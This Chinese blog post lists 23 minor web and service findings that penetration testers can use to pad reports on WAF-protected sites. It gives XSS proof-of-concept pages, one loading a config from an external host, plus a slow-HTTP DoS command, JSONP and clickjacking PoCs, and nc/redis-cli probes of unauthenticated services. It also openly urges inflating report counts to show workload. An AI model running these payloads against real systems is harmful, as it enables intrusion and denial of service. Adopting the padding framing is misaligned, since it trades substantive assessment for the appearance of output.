#  网安牛马碰见WAF如何凑出渗透报告漏洞数量？   
 Jie安全   2024-12-09 03:47  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/mpLzTQpY3UPtVrmHAzibGGgNhzn4kWpYuibzqibZty56icKugFQOibSpOeJ86aqg7y9RAWwT9GLSXURgibyX2ELDO4Kg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
前言  
  
  
  
网安牛马数载，蓦然回首，不过是些许风霜罢了......  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2HLvkkYUAyrAwicZl1zflL8kBiaR594h7EFDTAFK2kCQtGM1eWm9ELDMw/640?wx_fmt=png&from=appmsg "")  
  
  
遥想熊猫当年，面向WAF防护的渗透网站满眼惆怅，在当初内卷严重的牛马市场，如果你提交的渗透测试报告漏洞数量太少，再多借口也没用，只能被迫接受“菜鸡”称号，沦为测评、驻场的主要工作者，从此告别渗透、攻防......  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2efp580qeAZjKIbiajOqiciaw9UqQI9WP7Tzd146XuRsP74pBeg2ncwxIg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
所以当初熊猫为了脱离“菜鸡”称号可谓是煞费苦心，在测试有WAF防护的网站时，也会想办法凑出一堆中低危漏洞来充实报告内容，以证实工作量，便于划水......  
  
那都有哪些漏洞可以用来凑数量呢？  
  
**WARN**  
  
**提前说明一下：本文章涉及漏洞可能过于无耻，渗透大佬请自行告退，网安牛马如羞于提交请酌情观看，熊猫原则是，既然叫漏洞，那为什么不提呢？节操？别闹，都干安全了还要什么节操呀......**  
  
  
  
**愿兄弟们看完文章之后**  
  
**划水越来越多，挖洞越来越丝滑**  
  
**注：本期不发逻辑漏洞，逻辑漏洞会单独再发一篇文章**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg26qToz9ts0NJic0of6uibrMGZheo9pf9ZlKR90picqzMG9NRmic3Vtz9QsA/640?wx_fmt=gif&from=appmsg "")  
  
**1.Swagger-UI 反射型 XSS**  
  
漏洞场景：  
  
发现网站存在Swagger-UI的入口页面swagger-ui.html。  
  
漏洞复现：  
  
需要提前构造一个配置文件test.json放到自己的服务器里面，如下所示：  
```
{
"url": "https://jumpy-floor.surge.sh/test.yaml",
"urls": [
   {
       "url": "https://jumpy-floor.surge.sh/test.yaml",
       "name": "Foo"
   }
]
}
```  
  
然后在Swagger-UI中使用?configUrl=和url参数复现XSS漏洞，加载的类型比如这样：  
```
/swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json
/swagger-ui.html?url=https://jumpy-floor.surge.sh/test.json
/swagger-ui.html?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2ov0Y0qN03WJajcD3S3YtoJlycsMT4OHICAlBoaYQRcdKVYgD7LFeHw/640?wx_fmt=png&from=appmsg "")  
  
  
**2.JQuery框架Dom型XSS**  
  
漏洞场景：  
  
发现网站使用jQuery-js，并且版本与poc匹配。  
  
漏洞复现：  
  
poc中填写目标站点的JQueryjs地址，如图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2D373TmzzmqVNbpjOa5kb5THQxsyoHdu3CQKnbnLNbTsfTkic25OeNXQ/640?wx_fmt=png&from=appmsg "")  
```
<!DOCTYPE html>
<!-- poc请自行复制，保存为html格式 -->
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Jquery XSS</title>
    <script type="text/javascript" src="https://***.***.***/js/jquery-easyui-1.5.2/jquery.easyui.min.js"></script>
    <!-- <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.1/jquery.js"></script> -->
    <!-- <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.11.1/jquery.js"></script> -->
    <!-- <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.12.1/jquery.js"></script> -->
    <script>
        $(function () {
            // #9521
            // #11290
            $(location.hash);

            // #11974
            $('#bug').on('click', function () {
                $.parseHTML("<img src='z' onerror='alert(\"bug-11974\")'>");
                return false;
            });
        })
</script>
</head>

<body>
    <h1>jQuery with XSS</h1>
    <h2>Demo：</h2>
    <p style="color:red;">Note: Source code changes jQuery version，As long as there is no bullet window, there will be no problem.！</p>
    <ul>
        <li><a href="#<img src=/ onerror=alert(1)>" target="_blank">bug-9521</a> => <a
                href="https://bugs.jquery.com/ticket/9521" target="_blank">ticket</a></li>
        <li><a href="#p[class='<img src=/ onerror=alert(2)>']" target="_blank">bug-11290</a> => <a
                href="https://bugs.jquery.com/ticket/11290" target="_blank">ticket</a></li>
        <li><a href="#11974" id="bug">bug-11974</a> => <a href="https://bugs.jquery.com/ticket/11974"
                target="_blank">ticket</a></li>
    </ul>
    <h2>Test version：</h2>
    <ul>
        <li><a href="http://research.insecurelabs.org/jquery/test/" target="_blank">test result</a></li>
    </ul>
    <h2>Safe version：</h2>
    <ul>
        <li>1.12.0, 1.12.1 </li>
        <li>2.2.0, 2.2.1</li>
        <li>3.0.0, 3.0.1, 3.1.0, 3.1.1</li>
    </ul>
</body>

</html>
```  
  
复现截图：  
  
然后本地浏览器打开poc点击test result，弹窗则证明存在漏洞：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2BhWicVKj9MMx3JYPibS6WiaVb1LkzeR81iaCwVedGT5hZP9SJ6xAibWxOiag/640?wx_fmt=png&from=appmsg "")  
  
**3.SSLv2 Drown攻击信息泄露漏洞**  
  
漏洞场景：  
  
发现网站系统支持了SSLv2加密算法，且该算法被暴露存在Drown跨协议攻击TLS漏洞。  
  
漏洞复现：  
  
通过加密算法检测工具sslciphercheck，与网站系统进行加密算法枚举通信，探测系统存在的加密算法情况（工具下载链接如下）。  
```
https://github.com/woanware/woanware.github.io/blob/master/downloads/sslciphercheck.v.1.4.2.zip
运行方式：sslciphercheck.exe -h ip（目标地址） -p 443
```  
  
或者使用nmap输入如下命令：  
```
nmap -sV -p 端口 --script ssl-enum-ciphers 目标ip
```  
  
‍  
  
  
  
复现截图：  
  
sslciphercheck显示如下则证明存在漏洞：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2vAqGG1HyexPNO0Tfde6BSAQud137QG8vYUwa1oHEgMqMfwZhj7svfw/640?wx_fmt=png&from=appmsg "")  
  
**4.启用不安全的WebDAV模块**  
  
漏洞场景：  
  
网站使用HTTP协议。  
  
漏洞复现：  
  
这个风险也叫不安全的HTTP方法，发现渗透网站是HTTP方法后，使用curl命令探测：  
```
curl -I -X OPTIONS https://目标网站URL
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg27zmuGBoO1cQUuFNh8h81umMB7BfSnicDhokopEEplhLaiaVYe1fiaUyGA/640?wx_fmt=png&from=appmsg "")  
  
**5.易受Dos慢速攻击**  
  
漏洞场景：  
  
网站为HTTP协议。  
  
漏洞复现：  
  
需要本地下载slowhttptest工具，然后使用命令验证即可：  
```
项目地址：https://github.com/shekyan/slowhttptest
slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u https://xxxxxx
```  
  
当显示为NO，则表示存在HTTP慢速攻击漏洞，可导致拒绝服务。  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2cJCvtGPYcttTr8qHlPO8u6oDB8zPt2UUlSIAuHibKcA67rITuO4rdew/640?wx_fmt=png&from=appmsg "")  
  
**6.SSH支持弱加密算法风险**  
  
漏洞场景：  
  
开放22端口。  
  
漏洞复现：  
  
使用nmap输入如下命令扫描：  
```
nmap --script ssh2-enum-algos -sV -p 22 [IP]
```  
  
查看扫描结果中的加密算法情况。  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2ibEmOXQuguIW8jkOiaTYW2AibXDIeY0nurQ9WWDtrXGfypHBnPnZD3xkg/640?wx_fmt=png&from=appmsg "")  
  
**7.POODLE信息泄露漏洞**  
  
漏洞场景：  
  
发现网站系统使用了SSLv3协议。  
  
漏洞复现：  
  
通过加密算法检测工具sslciphercheck，与网站系统进行加密算法枚举通信，探测系统存在的加密算法情况。  
```
https://github.com/woanware/woanware.github.io/blob/master/downloads/sslciphercheck.v.1.4.2.zip
运行方式：sslciphercheck.exe -h ip（目标地址） -p 443
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg22D9pp1N2BMNVSicbICw7OvzocyVf5iaonYickCtLmYhm7HznwpRTbwvbA/640?wx_fmt=png&from=appmsg "")  
  
**8.SSL重协商漏洞**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
通过加密算法检测工具sslciphercheck，与网站系统进行加密算法枚举通信，探测系统存在的加密算法情况。  
```
https://github.com/woanware/woanware.github.io/blob/master/downloads/sslciphercheck.v.1.4.2.zip
运行方式：sslciphercheck.exe -h ip（目标地址） -p 443
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2Lqq1FlQfGoTpTuUIxydN1trg6phvsiayul9hSJ0xXYN90AJYdWbl5DA/640?wx_fmt=png&from=appmsg "")  
  
**9.HOST头部攻击**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
通常awvs可能会扫到，扫不到就是抓包之后改host即可，很简单。  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2ewAiaCXfrSR6WEvpwaBbO3u9qKCIRNXuR0RDn9As4euOQ9icUjKPAZPQ/640?wx_fmt=png&from=appmsg "")  
  
**10.点击劫持漏洞**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
通过替换poc中的URL，本地浏览器打开html查看是否被iframe标签嵌套。  
```
<html>
<head>
<title>Clickjacking</title>
</head>
<body>
<iframe src="https://test.com/" width="500" height="500" />
</iframe>
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2yRqk0LdYoticNz33Oj2EcV6uxROHbuQbYOhu7Y2JuJpFxtOGZGaasAg/640?wx_fmt=png&from=appmsg "")  
  
  
**11.前端js.map文件暴露导致vue代码泄露**  
  
漏洞场景：  
  
扫描发现有.map文件。  
  
漏洞复现：  
  
下载.map文件后，使用reverse-sourcemap还原vue代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2XicViaictTBScrTMBia7cSgq5bvgCELXDHPeIMZjXAvTOWPiaCZyHCGdyTg/640?wx_fmt=png&from=appmsg "")  
  
  
使用npm安装reverse-souecemap，命令如下：  
```
npm install reverse-sourcemap -g
reverse-sourcemap -o /存放逆向出源码的目录 -v /.map文件所在的目录
```  
  
下载.map文件后，使用reverse-sourcemap还原vue代码。  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2WlluiciaiaWhBTpJAx9nhvWkMZ7ialvIERDpeVIzVL4A6gpoicmrQmVFNuw/640?wx_fmt=png&from=appmsg "")  
  
**12.httpOnly Cookie信息泄露**  
  
漏洞场景：  
  
Apache解析。  
  
漏洞复现：  
  
通过Burpsuite抓包对参数  
注入超长字节，使用户的cookie大于4k。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaASuCo3OOy42EbEr5722CZjXGiabTvh5YiaFclcrvaWuPgWnM57zzHQiaHQ/640?wx_fmt=png&from=appmsg "")  
  
  
复现截图：  
  
  
返回报错页面泄露用户Cookie信息。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaAgF9r9XS70vV0kfPYNIjJJvEuOYUMXzNTNZFCnX0TaDIoGw0LgEjd7A/640?wx_fmt=png&from=appmsg "")  
  
**13.未设置cookie的httponly属性**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
通过浏览器控制台输入如下命令，弹窗及存在风险。  
```
javascript:alert(document.cookie)
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjas9Zl6kQBYfgicUibC6CRGPg2BePlY94zpU8jwJ26UC6eqXFG0Dx338x5CkTkX62KRFAraHKXRPA9zw/640?wx_fmt=png&from=appmsg "")  
  
**14.域名防护设置缺失**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
浏览器访问如下测试地址输入目标URL。  
```
http://whois.chinaz.com/caimipai.com
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaADrsmoZn9IrdqBUd6d1Jyg4PFBHA1gZnQR1xTOeqicUgxPkUn81ka9kg/640?wx_fmt=png&from=appmsg "")  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaA0bXxmicrZszjelEx3L48ANMe2qw1qwNHmh4xqNPFX26AAHBdGoGzCrQ/640?wx_fmt=png&from=appmsg "")  
  
**15.会话登出失效**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
通过手动点击注销登录之后使用注销的token继续尝试增删改查。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaALQubWk29FBMmPrjp81maiccc03dCFxreCnS3DQibW91mAic0TH85WgYWQ/640?wx_fmt=png&from=appmsg "")  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaAq82WoHR5VK6XAPEcIOxHYyUiawuewnia62bDPibiapGU9qvYJg90k2LV1A/640?wx_fmt=png&from=appmsg "")  
  
**16.JsonP劫持漏洞**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
将URL填入POC，浏览器打开html，弹窗则证明漏洞存在。  
```
<html>
  <body>
<script> function wooyun_callback(a){  alert(a);  }  </script>  
<script src="http://www.test.com/login.php?callback=wooyun_callback">
</script>  
  </body>
</html>
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaA8NsktTKO0ew7PvWzcsNd02q9Rgmic3tRb2EIuRcWibzz6plUyEwvmKiaQ/640?wx_fmt=png&from=appmsg "")  
  
**17.CORS**  
  
漏洞场景：  
  
基本Xray、AWVS都会扫出来。  
  
漏洞复现：  
  
直接上扫描。  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaAA0v4u0zHUjXWtBC64vEDdCibZgvwSYibh9LMEFhWf2FhNrX0tuLFMr6w/640?wx_fmt=png&from=appmsg "")  
  
**18.Memcached 未授权访问漏洞**  
  
漏洞场景：  
  
开放端口：11211。  
  
漏洞复现：  
  
nmap直接上扫描。  
```
nmap -sV -p 11211 --script=memcached-info 目标ip
```  
  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaA8jsB1DQ4ztBCEOeLotTn6CM7VbW08HuH5eibaxekCo9UMcBK5rK4xKQ/640?wx_fmt=png&from=appmsg "")  
  
**19.ZooKeeper 未授权访问**  
  
漏洞场景：  
  
开放端口：2181。  
  
漏洞复现：  
  
直接上kali。  
```
echo envi | nc 目标ip 2181
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaApVCqsiak8GicViaxAfPl8vfspoHnKKUPd3JD4icqAiagoBunZOd9ZjUjjzg/640?wx_fmt=png&from=appmsg "")  
  
**20.NFS未授权访问**  
  
漏洞场景：  
  
开放端口：2049 (默认)。  
  
漏洞复现：  
  
直接上kali。  
```
showmount -e IP
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaAE5gD0yzXgZK6ZGVUWl6SbpXbiaGS3g6FkWstfNv6gKSXGPibiciaiar1RXg/640?wx_fmt=png&from=appmsg "")  
  
**21.Redis未授权访问**  
  
漏洞场景：  
  
开放端口：6379。  
  
漏洞复现：  
  
直接上kali。  
```
redis-cli -h IP -p port
```  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaAFZDB5UemT2OMQ4XAf2t8HgV6NXujxfaWzKvqWVpj9U7cueVdH6Deiaw/640?wx_fmt=png&from=appmsg "")  
  
**22.Webpack源码泄露**  
  
漏洞场景：  
  
莽怼。  
  
漏洞复现：  
  
浏览器开发者模式看见Webpack提就完事了。  
  
复现截图：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/wglPJSKsjasX5Z6A2qicLQ1iaglvCpOPiaAbiaw2yfU0Xon08mgXPpECSgZFEbQgtgMHnQ6mhrkXbJPWvE5yRQzTibA/640?wx_fmt=jpeg "")  
****  
**23.OSS存储漏洞**  
  
漏洞场景：  
  
有存储桶文件访问。  
  
漏洞复现：  
  
直接看，当敏感文件上传到公开空间，则任何知道URL链接的人都能访问。  
  
  
复现截图：  
  
****  
****  
![](https://mmbiz.qpic.cn/mmbiz_gif/mpLzTQpY3UPtVrmHAzibGGgNhzn4kWpYuibzqibZty56icKugFQOibSpOeJ86aqg7y9RAWwT9GLSXURgibyX2ELDO4Kg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
总结  
  
  
  
  
除以上漏洞外，其实还有好多类似的漏洞，比如明文传输核心业务数据、多点认证缺陷、弱加密风险、IIS段文件名漏洞、证书失效、各种信息泄露.......  
  
这些大家都知道的熊猫就不写了，关键就是看大家愿不愿意。  
  
熊猫认为，只要有明确的整改建议以及明确的漏洞成因，那测到的漏洞就全可以提，干就完了，要不然还以为咱不知道这些漏洞呢![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Yellowdog.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Yellowdog.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Yellowdog.png "")  
。  
  
